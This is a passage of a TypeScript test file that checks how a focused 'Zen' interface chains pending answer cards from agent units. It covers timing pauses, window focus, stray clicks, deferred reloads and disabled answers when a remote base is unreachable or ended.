	assert.deepEqual(r.calls.remind.sort(), ["b", "c"]);
	await answerCard(r);
	page.focus = true; // back before the outcome ends: the chain draws b
	r.feed(trio(["a"]));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-b"]);
	page.focus = false;
	r.feed(trio(["a"])); // away again while b is on the screen
	assert.deepEqual(r.calls.remind.sort(), ["b", "c"], "b was reminded while it queued, and is not told of again when the chain drew it");
});

// --- the review of Z-D22 (ZCR-F001 to F005) ---------------------------------------------------------------------------------------------------------------------------------

test("Z-D22 (ZCR-F001, Z-D16): leaving Zen within the outcome and coming back later starts the visit at the breath: no card, no bowl, the cue counts the others", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a"]));
	await r.advance(300);
	r.z.hide(); // Esc Esc, the menu, or the palette's Standard
	await r.advance(60_000);
	r.z.show();
	await r.settle();
	assert.deepEqual(whoIs(r), [], "the visit does not open on b");
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length >= 1, true, "it opens on the breath");
	assert.deepEqual(r.calls.sound, ["bowl", "knock"], "no bowl for a card nobody took");
	await r.advance(PAUSE + 100);
	assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.");
});

test("Z-D22 (ZCR-F001): the page being hidden and shown while Standard has it does not take a card either, and a return inside the outcome is the breath once the outcome ends", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a"]));
	await r.advance(300);
	r.z.hide();
	r.z.visible(false);
	await r.advance(5_000);
	r.z.visible(true);
	await r.advance(5_000);
	r.z.show();
	await r.settle();
	assert.deepEqual(whoIs(r), [], "Standard's visibility change did not take b");
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	const q = await chainRig();
	await answerCard(q);
	q.feed(trio(["a"]));
	await q.advance(300);
	q.z.hide();
	await q.advance(200);
	q.z.show(); // back inside the 1.2 s outcome
	await q.advance(OUTCOME);
	assert.deepEqual(whoIs(q), [], "the outcome the visit interrupted does not end in a chain");
	assert.deepEqual(q.calls.sound, ["bowl", "knock"]);
});

test("Z-D22 (ZCR-F002, boss 2026-11-07 「只接你送出答案當下已在排的卡」): a card that arrives during the 1.2 s outcome is not chained into: the breath, and the cue waits for Enter", async () => {
	server();
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { name: "ops-a", since: 5, pending: { ...select({ dialog: "da" }), callId: "c-a" } })]));
	r.z.show();
	await r.settle();
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
	r.z.key("talk");
	await r.settle();
	await answerCard(r);
	await r.advance(600);
	r.feed(net([unit("a", "working", { name: "ops-a", since: 5 }), unit("b", "waiting", { name: "ops-b", since: 9, pending: { ...select({ dialog: "db" }), callId: "c-b" } })]));
	await r.advance(800);
	assert.deepEqual(whoIs(r), [], "b arrived after the answer: it did not take the screen");
	assert.deepEqual(r.calls.sound, ["bowl", "knock"], "and the bowl did not ring");
	assert.equal(r.by((el) => el.getAttribute("role") === "img")[0]?.getAttribute("aria-label"), "Take a breath", "the pause");
	await r.advance(PAUSE + 100);
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "b waits for Enter");
});

test("Z-D22 (ZCR-F002): a card that was queued when the answer was accepted is chained into, even one that came after the first Enter while the card was open", async () => {
	const r = await chainRig();
	r.feed(net(["a", "b", "c", "d"].map((k, i) => unit(k, "waiting", { name: `ops-${k}`, since: 5 + i, pending: { ...select({ dialog: `d${k}` }), callId: `c-${k}` } })))); // d arrives while a is open
	await answerCard(r);
	r.feed(net(["b", "c", "d"].map((k, i) => unit(k, "waiting", { name: `ops-${k}`, since: 6 + i, pending: { ...select({ dialog: `d${k}` }), callId: `c-${k}` } }))));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-b"]);
});

test("Z-D22 (ZCR-F003): a page that is shown but has lost the focus does not chain: no bowl, no card without the focus; the cue waits and the breath comes", async () => {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a"]));
	page.focus = false; // the boss moved to another window within the outcome
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), [], "b did not take the screen");
	assert.deepEqual(r.calls.sound, ["bowl", "knock"], "no bowl rang in a window nobody looks at");
	assert.deepEqual(r.calls.remind.sort(), ["b", "c"], "the page told of the cards that wait, once each, as on any page nobody looks at");
	page.focus = true;
	await r.advance(PAUSE + 100);
	assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.");
});

/** The chain has taken b and the 400 ms window is on. */
async function onB() {
	const r = await chainRig();
	await answerCard(r);
	r.feed(trio(["a"]));
	await r.advance(OUTCOME + 100);
	assert.deepEqual(whoIs(r), ["ops-b"]);
	return r;
}

test("Z-D22 (ZCR-F004): a press inside the window that never became a click does not swallow the next real click: a key, a cancelled press, or a click with no pointer behind it clears it", async () => {
	/** A press on b's choice inside the window that is dragged off (no click); 2 s later, the window is over. */
	const dead = async () => {
		const r = await onB(), choice = radios(r)[0]!;
		choice.bubble("pointerdown", { isTrusted: true, preventDefault() {}, stopPropagation() {} });
		await r.advance(2_000);
		let stopped = 0;
		return { r, choice, stopped: () => stopped, click: (detail: number) => choice.bubble("click", { isTrusted: true, detail, preventDefault() {}, stopPropagation: () => void stopped++ }) };
	};
	const key = await dead(); // a key since the press (the boss's Tab, or the Enter whose activation click follows)
	key.choice.bubble("keydown", { key: "Tab", repeat: false, timeStamp: Infinity, preventDefault() {}, stopPropagation() {} });
	key.click(1);
	assert.equal(key.stopped(), 0, "a key between the dead press and the click: the click is the card's own");
	const cancelled = await dead(); // the browser took the touch for a scroll
	cancelled.choice.bubble("pointercancel", { isTrusted: true });
	cancelled.click(1);
	assert.equal(cancelled.stopped(), 0, "pointercancel: the press never became a click");
	const keyboard = await dead(); // the click of a keyboard's activation has no detail
	keyboard.click(0);
	assert.equal(keyboard.stopped(), 0, "a keyboard's click is not a tap");
	// the real tap whose press began in the window and ended after it is still held
	const t = await onB(), pressed = radios(t)[0]!;
	let stopped = 0;
	pressed.bubble("pointerdown", { isTrusted: true, preventDefault() {}, stopPropagation() {} });
	await t.advance(DWELL + 50);
	pressed.bubble("click", { isTrusted: true, detail: 1, preventDefault() {}, stopPropagation: () => void stopped++ });
	assert.equal(stopped, 1, "a tap that began inside the window and ended after it is still held");
});

test("Z-D22 (ZCR-F005): a new build waiting while the chain runs does not reload between the cards; it loads at the breath", async () => {
	const r = await chainRig();
	const go = upgraded();
	r.z.upgrade(go);
	const counts: number[] = [];
	for (const gone of [["a"], ["a", "b"], ["a", "b", "c"]]) {
		await pass(r, DWELL + 100);
		await answerCard(r);
		r.feed(trio(gone));
		for (let t = 0; t < OUTCOME + 200; t += 100) { await r.advance(100); counts.push(go.reloads); }
	}
	assert.equal(Math.max(...counts), 0, "no reload under the boss's hand, between the cards or in the last pause's first moments");
	await pass(r, PAUSE + 4_000);
	assert.equal(go.reloads, 1, "the breath loads it, once");
});

const REMOTE = (state: "live" | "unreachable" | "ended"): NonNullable<Net["bases"][number]["box"]> => ({ device: "dev1", short: "a1b2c3", label: "agent-tower-01", team: "moldplan", scope: "team", can: ["input", "answer", "keys"], state, ...(state === "unreachable" ? { seen: 1 } : {}) });
const onBox = (n: Net, state: "live" | "unreachable" | "ended"): Net => ({ ...n, bases: n.bases.map((b) => ({ ...b, box: REMOTE(state) })) });

test("a unit of an unreachable or ended remote base takes no answer in Zen: its choices and Send are off with the reason shown; a live box and a local base answer as before", async () => {
	for (const [state, off] of [["unreachable", true], ["ended", true], ["live", false], [undefined, false]] as const) {
		const r = rig();
		const base = net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]);
		r.feed(state ? onBox(base, state) : base);
		r.z.show();
		await r.settle();
		r.z.key("talk");
		await r.settle();
		const radios = r.by((el) => el.getAttribute("role") === "radio");
		assert.ok(radios.length > 0, String(state));
		assert.ok(radios.every((x) => x.disabled === off), `${state}: choices ${off ? "off" : "on"}`);
		assert.equal(r.text().includes(m.box_answer_blocked()), off, `${state}: the reason is shown only when the box is the cause`);
	}
});

test("a box going unreachable turns a card that was answerable off at the next snapshot, and its return turns it on", async () => {
	const r = rig();
	const base = net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]);
	r.feed(onBox(base, "live"));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	const radios = () => r.by((el) => el.getAttribute("role") === "radio");
	assert.ok(radios().every((x) => !x.disabled));
	r.feed(onBox(base, "unreachable"));
	await r.settle();
	assert.ok(radios().every((x) => x.disabled), "unreachable");
	r.feed(onBox(base, "live"));
	await r.settle();
	assert.ok(radios().every((x) => !x.disabled), "and back");
	assert.ok(!r.text().includes(m.box_answer_blocked()));
});

test("RR-F002: a wait card on an unreachable or ended remote base is off and says box_answer_blocked, not the connection words; a live box and a local base keep the card on", async () => {
	for (const [state, off] of [["unreachable", true], ["ended", true], ["live", false], [undefined, false]] as const) {
		const r = rig({ start: null });
		const base = waitNet(r);
		r.feed(state ? onBox(base, state) : base);
		r.z.show();
		await r.settle();
		r.z.key("talk");
		await r.settle();
		assert.ok(r.button("Skip"), `${state}: the card is drawn`);
		assert.equal(r.button("Skip")!.disabled, off, `${state}: Skip`);
		assert.equal(r.text().includes(m.box_answer_blocked()), off, `${state}: the box's reason only when the box is the cause`);
		assert.ok(!r.text().includes(m.wc_stale()), `${state}: the connection is fine`);
	}
});

test("R-F001: the companion's log of a unit on an unreachable or ended remote base is told its box is away, a live box and a local base are not, and every snapshot has the log read the box again", async () => {
	for (const [state, off] of [["unreachable", true], ["ended", true], ["live", false], [undefined, false]] as const) {
		const r = rig({ start: { key: "m", ws: "w" } });
		const base = net([unit("m", "working")]);
		r.feed(state ? onBox(base, state) : base);
		r.z.show();
		await r.settle();
		const chat = r.calls.chats.at(-1);
		assert.ok(chat, `${state}: the log is mounted`);
		assert.equal(chat.away(), off, String(state));
		const before = r.calls.boxes;
		r.feed(state ? onBox(base, state === "live" ? "unreachable" : "live") : base);
		await r.settle();
		assert.ok(r.calls.boxes > before, `${state}: the next snapshot has the blocks read the box again`);
	}
});

test("R-F001: the context expanded on a card (Zen's history of the unit) is told its box is away as well, and reads the box again at the next snapshot", async () => {
	for (const [state, off] of [["unreachable", true], ["live", false]] as const) {
		const r = rig();
		const base = net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]);
		r.feed(onBox(base, state));
		r.z.show();
		await r.settle();
		r.z.key("talk");
		await r.settle();
		r.z.key("history");
		await r.settle();
		const chat = r.calls.chats.at(-1);
		assert.ok(chat, `${state}: the context is mounted`);
		assert.equal(chat.away(), off, state);
		const before = r.calls.boxes;
		r.feed(onBox(base, state === "live" ? "unreachable" : "live"));
		await r.settle();
		assert.ok(r.calls.boxes > before, state);
	}
});
